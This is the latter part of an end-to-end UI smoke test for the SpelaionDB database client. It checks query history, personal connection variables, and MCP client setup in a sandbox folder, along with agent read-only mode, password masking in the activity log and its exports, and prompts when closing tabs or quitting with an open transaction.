  await history.getByRole("textbox", { name: "Search query history" }).fill("history_resumed_marker");
  await waitForHistoryCount(1);
  await history.locator(".history-sql", { hasText: "history_resumed_marker" }).waitFor();
  await shot("10-history-persisted");

  step("history: cancelled queries translate without changing database errors");
  await page.getByRole("button", { name: "Close query history" }).click();
  panel = await newQuery("Shop (SQLite)", "with recursive cancel_history_marker(x) as (select 1 union all select x + 1 from cancel_history_marker where x < 100000000) select x from cancel_history_marker;");
  await run(panel);
  await panel.locator(".grid-host").waitFor();
  await panel.getByRole("button", { name: "Cancel", exact: true }).click();
  await panel.getByRole("button", { name: "Run", exact: true }).waitFor();
  await page.getByRole("button", { name: "Query history", exact: true }).click();
  await history.getByRole("textbox", { name: "Search query history" }).fill("cancel_history_marker");
  await waitForHistoryCount(1);
  await history.locator(".history-error", { hasText: "Query cancelled" }).waitFor();
  await setLanguage("es");
  await page.locator("#query-history .history-error", { hasText: "Consulta cancelada" }).waitFor();
  await setLanguage("en");

  step("history: load older queries in bounded pages");
  await page.getByRole("button", { name: "Close query history" }).click();
  await replaceQuery(panel, Array.from({ length: 105 }, (_, i) => `select ${i} as history_page_marker;`).join("\n"));
  await run(panel);
  await panel.getByRole("button", { name: "Run", exact: true }).waitFor();
  await page.getByRole("button", { name: "Query history", exact: true }).click();
  await history.getByRole("textbox", { name: "Search query history" }).fill("history_page_marker");
  await waitForHistoryCount(100);
  await history.getByRole("button", { name: "Load more", exact: true }).click();
  await waitForHistoryCount(105);
  const pageStatements = await history.locator(".history-sql").allTextContents();
  assert.equal(new Set(pageStatements).size, 105);
  assert.equal(await history.getByRole("button", { name: "Load more", exact: true }).count(), 0);
  await shot("11-history-pages");

  step("personal variables a connection needs are asked once and saved in user.toml");
  await page.getByRole("button", { name: "Close query history" }).click();
  const varsPanel = await newQuery("Personal vars", "select count(*) as n from product;");
  await run(varsPanel);
  const variables = page.getByRole("dialog", { name: "This connection needs some personal values" });
  await variables.getByText("${user.demo_db}", { exact: true }).waitFor();
  await shot("11a-personal-variables");
  await variables.getByLabel("demo_db", { exact: true }).fill(join(demo, "data", "shop.db").replaceAll("\\", "/"));
  await variables.getByRole("button", { name: "Save and connect" }).click();
  await variables.waitFor({ state: "detached" });
  await varsPanel.locator(".statusline", { hasText: "1 row" }).waitFor();
  assert.match(readFileSync(join(userDir, "user.toml"), "utf8"), /demo_db = ".*shop\.db"/);

  step("MCP server page: a client is set up only after its change is shown, with a backup");
  // Every client file lives under this run's own folder (SPELAION_MCP_CLIENTS_HOME), and the
  // command written is a stand-in (SPELAION_CLI): the user's real files are never touched.
  const desktopFile = join(clientsHome, "AppData", "Roaming", "Claude", "claude_desktop_config.json");
  if (process.platform === "win32") {
    mkdirSync(dirname(desktopFile), { recursive: true });
    writeFileSync(desktopFile, '{\n  "globalShortcut": "",\n  "mcpServers": {\n    "other": { "command": "other-server" }\n  }\n}\n');
  }
  await page.getByRole("button", { name: "MCP server", exact: true }).click();
  const mcp = page.locator(".mcp-page");
  await mcp.getByRole("heading", { name: "MCP server", level: 1 }).waitFor();
  await mcp.getByRole("tab", { name: "Configuration", selected: true }).waitFor();
  await mcp.locator(".mcp-cli code", { hasText: fakeCli }).waitFor();
  const clientCards = mcp.getByRole("list", { name: "AI clients" }).getByRole("group");
  await clientCards.first().waitFor();
  assert.equal(await clientCards.count(), 6);
  for (const path of await mcp.locator(".mcp-client-path").allTextContents()) {
    assert.ok(path.startsWith(clientsHome), `${path} is outside the run's folder`);
  }
  await shot("mcp-configuration");
  if (process.platform === "win32") {
    const desktop = clientCards.filter({ hasText: "Claude Desktop" });
    await desktop.locator(".mcp-state", { hasText: "Not set up" }).waitFor();
    await desktop.getByRole("button", { name: "Install configuration" }).click();
    const install = page.getByRole("dialog", { name: "Set up Claude Desktop" });
    await install.getByText("Only SpelaionDB's entry changes in:").waitFor();
    await install.locator(".diff-added", { hasText: '"spelaiondb": {' }).waitFor();
    assert.equal(await install.locator(".diff-removed", { hasText: "globalShortcut" }).count(), 0);
    await shot("mcp-install-diff");
    // Cancel writes nothing.
    await install.getByRole("button", { name: "Cancel" }).click();
    await install.waitFor({ state: "detached" });
    assert.ok(!readFileSync(desktopFile, "utf8").includes("spelaiondb"));
    await desktop.getByRole("button", { name: "Install configuration" }).click();
    await install.getByRole("button", { name: "Write the file" }).click();
    await install.waitFor({ state: "detached" });
    await mcp.getByRole("status").filter({ hasText: "Claude Desktop is set up" }).waitFor();
    await desktop.locator(".mcp-state", { hasText: /^Set up$/ }).waitFor();
    assert.equal(await desktop.getByRole("button", { name: "Install configuration" }).isDisabled(), true);
    const written = JSON.parse(readFileSync(desktopFile, "utf8"));
    assert.equal(written.mcpServers.spelaiondb.command, fakeCli);
    assert.deepEqual(written.mcpServers.spelaiondb.args, ["mcp"]);
    assert.equal(written.mcpServers.other.command, "other-server");
    assert.equal(written.globalShortcut, "");
    assert.ok(
      readdirSync(dirname(desktopFile)).some((name) => name.startsWith("claude_desktop_config.json.spelaion-backup-")),
      "a backup of the previous file is kept",
    );
  }
  // A client without a file: it is created with only our server.
  const cursor = clientCards.filter({ hasText: "Cursor" });
  await cursor.getByRole("button", { name: "Install configuration" }).click();
  const cursorInstall = page.getByRole("dialog", { name: "Set up Cursor" });
  await cursorInstall.getByText("This file will be created:").waitFor();
  await cursorInstall.getByRole("button", { name: "Write the file" }).click();
  await cursorInstall.waitFor({ state: "detached" });
  await cursor.locator(".mcp-state", { hasText: /^Set up$/ }).waitFor();
  assert.deepEqual(JSON.parse(readFileSync(join(clientsHome, ".cursor", "mcp.json"), "utf8")), {
    mcpServers: { spelaiondb: { command: fakeCli, args: ["mcp"] } },
  });
  // The manual configuration of the selected client, and Claude Code's command.
  await clientCards.filter({ hasText: "Codex" }).getByRole("button", { name: "Codex", exact: true }).click();
  await mcp.getByRole("complementary", { name: "Manual configuration for Codex" }).getByText("[mcp_servers.spelaiondb]").waitFor();
  await clientCards.filter({ hasText: "Claude Code" }).getByRole("button", { name: "Claude Code", exact: true }).click();
  await mcp.getByLabel("claude mcp add command").getByText("claude mcp add --scope user spelaiondb --", { exact: false }).waitFor();
  assert.ok(!existsSync(join(clientsHome, ".claude.json")), "nothing is written without a click");

  step("MCP server page, Security: default tool output and read-only mode for every agent");
  await mcp.getByRole("tab", { name: "Security" }).click();
  const shopAccess = mcp.locator('tr[data-connection="shop"]');
  await shopAccess.getByText("The connection does not let agents write.").waitFor();
  await mcp.getByRole("radio", { name: /TOON/ }).check();
  await mcp.getByRole("switch", { name: "Every agent is read-only" }).check();
  await shopAccess.getByText("Read-only mode is on.").waitFor();
  await shot("mcp-security");
  // Both are kept: leave the page and come back.
  await page.getByRole("button", { name: "Connections", exact: true }).click();
  await mcp.waitFor({ state: "detached" });
  await page.getByRole("button", { name: "MCP server", exact: true }).click();
  await mcp.getByRole("tab", { name: "Security" }).click();
  await mcp.getByRole("switch", { name: "Every agent is read-only" }).and(page.locator(":checked")).waitFor();
  await mcp.getByRole("radio", { name: /TOON/ }).and(page.locator(":checked")).waitFor();
  await mcp.getByRole("switch", { name: "Every agent is read-only" }).uncheck();
  await shopAccess.getByText("The connection does not let agents write.").waitFor();
  await page.getByRole("button", { name: "Connections", exact: true }).click();
  await mcp.waitFor({ state: "detached" });

  step("MCP server page, Activity: calls from a real spelaiondb mcp, filtered, exported and cleared");
  await page.getByRole("button", { name: "MCP server", exact: true }).click();
  await mcp.getByRole("tab", { name: "Activity" }).click();
  await mcp.getByText("No MCP calls yet.", { exact: false }).waitFor();
  // A real agent session over stdio, as an AI client runs it, on this run's folder.
  await agentSession([
    ["run_query", { connection: "shop", sql: "select count(*) as n from product" }],
    ["execute_write", { connection: "shop", sql: "insert into product (name) values ('x')" }],
    ["execute_write", { connection: "shop", sql: "alter user bob password 'hunter2'" }],
  ]);
  await mcp.getByRole("button", { name: "Refresh" }).click();
  await mcp.getByRole("status").filter({ hasText: "4 events" }).waitFor();
  const events = mcp.getByRole("table", { name: "Events" });
  await events.getByRole("row").filter({ hasText: "select count(*) as n from product" }).getByText("OK").waitFor();
  await events.getByRole("row").filter({ hasText: "insert into product" }).getByText("Refused").waitFor();
  await events.getByText("alter user bob password '***'").waitFor();
  assert.ok(!(await mcp.innerText()).includes("hunter2"), "a password never shows");
  await shot("mcp-activity");
  await mcp.getByLabel("Status").selectOption("refused");
  await mcp.getByRole("status").filter({ hasText: "2 events" }).waitFor();
  await mcp.getByLabel("Status").selectOption("");
  await mcp.getByLabel("Tool").selectOption("run_query");
  await mcp.getByRole("status").filter({ hasText: "1 event" }).waitFor();
  await mcp.getByLabel("Tool").selectOption("");
  await mcp.getByRole("searchbox", { name: "Search statements" }).fill("ALTER USER");
  await mcp.getByRole("status").filter({ hasText: "1 event" }).waitFor();
  await mcp.getByRole("searchbox", { name: "Search statements" }).fill("");
  await mcp.getByRole("status").filter({ hasText: "4 events" }).waitFor();
  // Export: the core writes it, secrets masked and no cell read as a formula.
  const csvPath = join(userDir, "activity.csv");
  await page.evaluate((path) => { window.__spelaionSavePath = path; }, csvPath);
  await mcp.getByRole("button", { name: "Export CSV" }).click();
  await mcp.getByText("4 events exported to", { exact: false }).waitFor();
  const activityCsv = readFileSync(csvPath, "utf8");
  assert.ok(activityCsv.startsWith("time,session,client,connection,tool,statement,status,rows,duration_ms,detail\n"), activityCsv);
  assert.ok(activityCsv.includes(",smoke-agent,shop,execute_write,alter user bob password '***',refused,"), activityCsv);
  assert.ok(!activityCsv.includes("hunter2"), activityCsv);
  const jsonPath = join(userDir, "activity.json");
  await page.evaluate((path) => { window.__spelaionSavePath = path; }, jsonPath);
  await mcp.getByRole("button", { name: "Export JSON" }).click();
  await mcp.getByText(`4 events exported to ${jsonPath}`, { exact: false }).waitFor();
  assert.equal(JSON.parse(readFileSync(jsonPath, "utf8")).length, 4);
  await page.evaluate(() => { delete window.__spelaionSavePath; });
  // Sessions: the agent's process, opening into its calls.
  await mcp.getByRole("tab", { name: "Sessions" }).click();
  const sessions = mcp.getByRole("table", { name: "Sessions" });
  await sessions.getByRole("row").filter({ hasText: "smoke-agent" }).getByText("4 calls").waitFor();
  await sessions.getByRole("row").filter({ hasText: "smoke-agent" }).getByRole("button", { name: "Show calls" }).click();
  await mcp.getByText("Calls of the smoke-agent session", { exact: false }).waitFor();
  await mcp.getByRole("status").filter({ hasText: "4 events" }).waitFor();
  // Clear: confirmed, done by the core, and recorded.
  await mcp.getByRole("button", { name: "Clear", exact: true }).click();
  const clearDialog = page.getByRole("dialog", { name: "Clear the MCP activity?" });
  await clearDialog.getByRole("button", { name: "Cancel" }).click();
  await mcp.getByRole("status").filter({ hasText: "4 events" }).waitFor();
  await mcp.getByRole("button", { name: "Clear", exact: true }).click();
  await clearDialog.getByRole("button", { name: "Clear the log" }).click();
  await mcp.getByText("4 events cleared.").waitFor();
  await mcp.getByRole("status").filter({ hasText: "1 event" }).waitFor();
  await events.getByText("Log cleared").waitFor();
  await page.getByRole("button", { name: "Connections", exact: true }).click();
  await mcp.waitFor({ state: "detached" });

  step("tabs: close all, then close others asks once for a transaction and a running query, keeps pinned tabs, and reopen brings tabs back disconnected");
  {
    const tabs = page.locator(".tabbar .tab");
    const activeTab = page.locator(".tabbar .tab.active");
    const shown = page.locator(".tab-panel:not([hidden])");
    const labels = () => page.locator(".tabbar .tab .tab-label").allInnerTexts();
    const rename = async (name) => {
      await page.keyboard.press("Control+F2");
      const input = activeTab.locator("input.tab-rename");
      await input.fill(name);
      await input.press("Enter");
      await input.waitFor({ state: "detached" });
    };
    // Close all (Ctrl+Shift+W); a tab left with a transaction or a running query would ask.
    await page.keyboard.press("Control+Shift+W");
    await page.waitForFunction(() => document.querySelectorAll(".tabbar .tab").length === 0 || document.querySelector('[role="dialog"] .modal-actions .danger'));
    if (await tabs.count() > 0) await page.locator('[role="dialog"] .modal-actions .danger').click();
    await page.waitForFunction(() => document.querySelectorAll(".tabbar .tab").length === 0);
    // A transaction open, a query running, a pinned tab, and the tab whose others close.
    const txPanel = await newQuery("Shop (SQLite)", "create temp table close_tx (x);");
    await run(txPanel);
    await txPanel.getByText("Statement 1: OK", { exact: false }).first().waitFor();
    await txPanel.locator(".transaction-controls").getByRole("checkbox", { name: "Auto-commit" }).click();
    await txPanel.locator(".transaction-controls input[type=checkbox]:not(:checked)").waitFor();
    await replaceQuery(txPanel, "insert into close_tx values (1);");
    await run(txPanel);
    await txPanel.locator(".tx-badge", { hasText: "TX open · 1" }).waitFor();
    await rename("Open transaction");
    const longSql = "with recursive close_cancel_marker(i) as (select 1 union all select i + 1 from close_cancel_marker) select count(*) from close_cancel_marker;";
    const runPanel = await newQuery("Shop (SQLite)", longSql);
    await run(runPanel);
    await activeTab.locator(".tab-running").waitFor();
    await rename("Long query");
    await newQuery("Shop (SQLite)", "select 'pinned';");
    await rename("Pinned");
    await page.keyboard.press("Control+Alt+p");
    await page.locator('.tabbar .tab.active[data-pinned="true"]').waitFor();
    await newQuery("Shop (SQLite)", "select 'kept';");
    await rename("Kept");
    assert.deepEqual(await labels(), ["Pinned", "Open transaction", "Long query", "Kept"]);
    // Close others from the menu: one question names both tabs; Cancel closes nothing.
    await activeTab.click({ button: "right" });
    await page.getByRole("menu", { name: "Actions for Kept" }).getByRole("menuitem", { name: /^Close others/ }).click();
    const closeOthers = page.getByRole("dialog", { name: "Close with an open transaction?" });
    await closeOthers.getByText("the server rolls back what was not committed", { exact: false }).waitFor();
    assert.deepEqual(await closeOthers.locator(".open-transaction-list li").allInnerTexts(), ["Open transaction"]);
    assert.deepEqual(await closeOthers.locator(".running-list li").allInnerTexts(), ["Long query"]);
    await shot("12a-close-others-asks");
    await closeOthers.getByRole("button", { name: "Cancel", exact: true }).click();
    await closeOthers.waitFor({ state: "detached" });
    assert.equal(await tabs.count(), 4);
    assert.equal(await page.locator(".tabbar .tab-running").count(), 1, "the query still runs");
    // Ctrl+Alt+W asks the same; accepted, both close and the running query is cancelled.
    await page.keyboard.press("Control+Alt+w");
    await closeOthers.getByRole("button", { name: "Close and roll back" }).click();
    await page.waitForFunction(() => document.querySelectorAll(".tabbar .tab").length === 2);
    assert.deepEqual(await labels(), ["Pinned", "Kept"]);
    assert.equal(await activeTab.locator(".tab-label").innerText(), "Kept");
    // The core recorded the closed tab's query as cancelled.
    if (!(await page.getByRole("complementary", { name: "Query history", exact: true }).isVisible())) {
      await page.getByRole("button", { name: "Query history", exact: true }).click();
    }
    const closedHistory = page.getByRole("complementary", { name: "Query history", exact: true });
    await closedHistory.getByRole("textbox", { name: "Search query history" }).fill("close_cancel_marker");
    await waitForHistoryCount(1);
    await closedHistory.locator(".history-error", { hasText: "Query cancelled" }).waitFor();
    await page.getByRole("button", { name: "Close query history" }).click();
    // Reopen (Ctrl+Shift+T): back in place, with name, SQL and connection; disconnected,
    // without results or transaction, and nothing runs.
    await page.keyboard.press("Control+Shift+T");
    assert.equal(await activeTab.locator(".tab-label").innerText(), "Open transaction");
    await activeTab.locator(".dot-disconnected").waitFor();
    assert.equal(await activeTab.locator(".tab-tx").count(), 0);
    assert.equal(await shown.locator(".cm-content").innerText(), "insert into close_tx values (1);");
    assert.equal(await shown.locator("select").first().evaluate((el) => el.selectedOptions[0].text), "Shop (SQLite) (sqlite)");
    assert.equal(await shown.locator(".grid-host").count(), 0);
    await page.keyboard.press("Control+Shift+T");
    assert.equal(await activeTab.locator(".tab-label").innerText(), "Long query");
    assert.equal(await shown.locator(".cm-content").innerText(), longSql);
    await page.waitForTimeout(300);
    assert.equal(await activeTab.locator(".tab-running").count(), 0, "a reopened tab runs nothing");
    await activeTab.locator(".dot-disconnected").waitFor();
    assert.deepEqual(await labels(), ["Pinned", "Open transaction", "Long query", "Kept"]);
    // Close all leaves the pinned tab; its own Ctrl+W still closes it.
    await page.keyboard.press("Control+Shift+W");
    await page.waitForFunction(() => document.querySelectorAll(".tabbar .tab").length === 1);
    assert.deepEqual(await labels(), ["Pinned"]);
    await shot("12b-close-all-keeps-pinned");
    await page.keyboard.press("Control+w");
    await page.waitForFunction(() => document.querySelectorAll(".tabbar .tab").length === 0);
  }

  step("quitting with a transaction open asks first: Cancel keeps the app, the dialog quits");
  const quitPanel = await newQuery("Shop (SQLite)", "create temp table quit_tx (x);");
  await run(quitPanel);
  await quitPanel.getByText("Statement 1: OK", { exact: false }).first().waitFor();
  await quitPanel.locator(".transaction-controls").getByRole("checkbox", { name: "Auto-commit" }).click();
  await quitPanel.locator(".transaction-controls input[type=checkbox]:not(:checked)").waitFor();
  await replaceQuery(quitPanel, "insert into quit_tx values (1);");
  await run(quitPanel);
  await quitPanel.locator(".tx-badge", { hasText: "TX open · 1" }).waitFor();
  // The window's close button (WM_CLOSE): the core holds the window and the UI asks.
  execFileSync("taskkill", ["/PID", String(app.pid)], { stdio: "ignore" });
  const quitOpen = page.getByRole("dialog", { name: "Quit with an open transaction?" });
  await quitOpen.waitFor();
  await shot("11b-quit-open-transaction");
  await quitOpen.getByRole("button", { name: "Cancel", exact: true }).click();
  await quitOpen.waitFor({ state: "detached" });
  assert.equal(app.exitCode, null, "Cancel keeps the app open");
  execFileSync("taskkill", ["/PID", String(app.pid)], { stdio: "ignore" });
  const exitedOnQuit = once(app, "exit");
  await page.getByRole("dialog", { name: "Quit with an open transaction?" }).getByRole("button", { name: "Quit and roll back" }).click();
  await Promise.race([exitedOnQuit, new Promise((_, reject) => setTimeout(() => reject(new Error("the app did not quit")), 15_000))]);

  console.log(`\nOK. Screenshots in ${shots}`);
} catch (e) {
  if (e === editSmokeComplete) console.log("\nOK. Editing smoke test passed.");
  else {
    failed = true;
    console.error("\nFAILED:", e);
    try {
      await browser.contexts()[0].pages()[0].screenshot({ path: join(shots, "failure.png") });
    } catch {}
  }
} finally {
  writeFileSync(shopFile, shopOriginal);
  // A copy the run made in the demo repository, if a failure left it behind.
  for (const copy of ["mysql-copy.toml", "mysql-copy-2.toml"]) rmSync(join(demo, ".spelaion", "connections", "docker", copy), { force: true });
  await browser.close().catch(() => {});
  await stopApp();
  // WebView2 lets go of its profile (inside userDir) a moment after the app exits.
  try {
    rmSync(userDir, { recursive: true, force: true, maxRetries: 40, retryDelay: 250 });
  } catch (e) {
    console.warn(`could not remove ${userDir}: ${e.message}`);
  }
  process.exit(failed ? 1 : 0);
}
